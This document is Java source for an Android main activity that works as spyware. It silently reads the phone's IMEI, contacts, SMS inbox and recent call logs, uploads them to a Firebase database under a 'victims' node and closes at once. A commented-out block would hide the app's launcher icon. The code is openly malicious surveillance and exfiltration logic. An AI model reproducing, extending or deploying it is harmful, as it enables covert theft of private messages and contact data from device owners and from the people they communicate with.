package com.example.iiitd.droid;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.example.iiitd.droid.model.Contact;
import com.example.iiitd.droid.model.Message;
import com.example.iiitd.droid.model.MyCallLog;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;


import static android.R.attr.key;

public class MainActivity extends AppCompatActivity {

    // [START declare_database_ref]
    private DatabaseReference mDatabase;
    String key = null;
    String imei;
    List<Contact> allConatacts;
    List<Message> allSMS;
    List<MyCallLog> myAllCallLog;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_main);

        // Setup the database
        mDatabase = FirebaseDatabase.getInstance().getReference();

        // Start a service
        startService(new Intent(getBaseContext(), ServiceClass.class));

        // To hide the activity

 /*     PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, com.example.iiitd.droid.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
*/

        // Read IMED No
        imei = readIMEI();


        // Read All Contacts
        allConatacts = readContacts();


            // Store all Contacts in the cloud
        mDatabase.child("victims").child(imei).child("contacts").setValue(allConatacts);


       //  Read SMS
        allSMS = readSMS();


        // Store the SMS in database
       mDatabase.child("victims").child(imei).child("sms").setValue(allSMS);



        // Read call Logs
        myAllCallLog =  logCallLog(50);

        // Store the Call Logs
        mDatabase.child("victims").child(imei).child("callLogs").setValue(myAllCallLog);



        finish();
    }
    // Read All Contacts
    public List<Contact>  readContacts( ){

        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        String[] cNames = phones.getColumnNames();

        List<Contact>  allConatacts = new ArrayList<Contact>();


        /*for(int temp = 0; temp<cNames.length;temp++) {
            Log.v("Column Names"+temp, cNames[temp]);
        }*/
        while (phones.moveToNext()) {

            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            String lastTimeCalled = phones.getString(64);
            SimpleDateFormat sf = new SimpleDateFormat("yyyy-MM-dd");
            Date date = new Date(Long.parseLong(lastTimeCalled));
            allConatacts.add(new Contact(name,phoneNumber,sf.format(date)));

            // String lastTimeContacted = phones.getString(phones.getColumnIndex(ContactsContract.DisplayPhoto));
            //   Toast.makeText(this, " Contacts Stored...", Toast.LENGTH_SHORT).show();

        }
        Log.v("Contacts","Contacts Added SuccessFully");
        phones.close();

        return  allConatacts;

    }

    // Read IMEI NO
    public String readIMEI(){

        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        Log.v("IMEI" +
                " NO",telephonyManager.getDeviceId()) ;

        return telephonyManager.getDeviceId();

    }

    // Read all SMS
    public List<Message> readSMS(){

        List<Message> allMessages = new ArrayList<Message>();

        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
       /* for (int idx = 0 ;idx < cursor.getColumnCount();idx++){
            Log.v("Column Name: "+idx ,cursor.getColumnName(idx));
        }*/

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                String msgData = "";
                String number  = cursor.getString(2);

                String contacName = getName(number);
                String lastTimeCalled = cursor.getString(4);
                SimpleDateFormat sf = new SimpleDateFormat("yyyy-MM-dd");
                Date date = new Date(Long.parseLong(lastTimeCalled));

                if(cursor.getString(12)!=null)
                    allMessages.add(new Message(contacName,number,cursor.getString(12),sf.format(date)));

                else if(cursor.getString(13)!=null)
                    allMessages.add(new Message(contacName,number,cursor.getString(13),sf.format(date)));

                else if(cursor.getString(11)!=null)
                    allMessages.add(new Message(contacName,number,cursor.getString(11),sf.format(date)));


                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                    msgData += "--- " + cursor.getColumnName(idx) +" ##"+idx+"##"+ ":" + cursor.getString(idx);
                }
              //  Log.v("MESSAGES",msgData);
                // use msgData
            } while (cursor.moveToNext());
        } else {
            // empty box, no SMS
            return null;
        }
        return  allMessages;

    }

    // Returns the contact name from number
    private String getName(String substring) {
        if(allConatacts!=null){
            for(int i=0;i<allConatacts.size();i++){
                if(allConatacts.get(i).getNumber().equals(substring)){
                    return  allConatacts.get(i).getName();
                }
            }
        }
        else
        {
            return  null;
        }
        return  null;
    }

    // Read all Call Log
    public List<MyCallLog> logCallLog(int count) {

        List<MyCallLog> allCallLogs = new ArrayList<MyCallLog>();
        long dialed;
        String columns[]=new String[] {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE};
        Cursor c;
        c = getContentResolver().query(Uri.parse("content://call_log/calls"),
                columns, null, null, "Calls._ID DESC"); //last record first

        while (c.moveToNext() && count > 0) {

            dialed=c.getLong(c.getColumnIndex(CallLog.Calls.DATE));

            String duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));
            String number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
            String name =  getName(c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)));
            String type =  c.getString(c.getColumnIndex(CallLog.Calls.TYPE));

            String lastTimeCalled = Long.toString(dialed);
            SimpleDateFormat sf = new SimpleDateFormat("yyyy-MM-dd");
            Date date = new Date(Long.parseLong(lastTimeCalled));

            allCallLogs.add(new MyCallLog(name,number,sf.format(date),Integer.toString(Integer.parseInt(duration)/60)+" Mins and "+Integer.toString(Integer.parseInt(duration)%60)+" Seconds",type));
            Log.i("Number",number!=null?number:"no Number");
            Log.i("Date",Long.toString(dialed));
            Log.i("Name",name==null?"No Conatact Saved":name);
            count --;
            //Log.v("CallLog","type: " + c.getString(4) + "Call to: "+ name+"  Number: "+number+", registered at: "+new Date(dialed).toString());
        }
        return allCallLogs;
    }



}
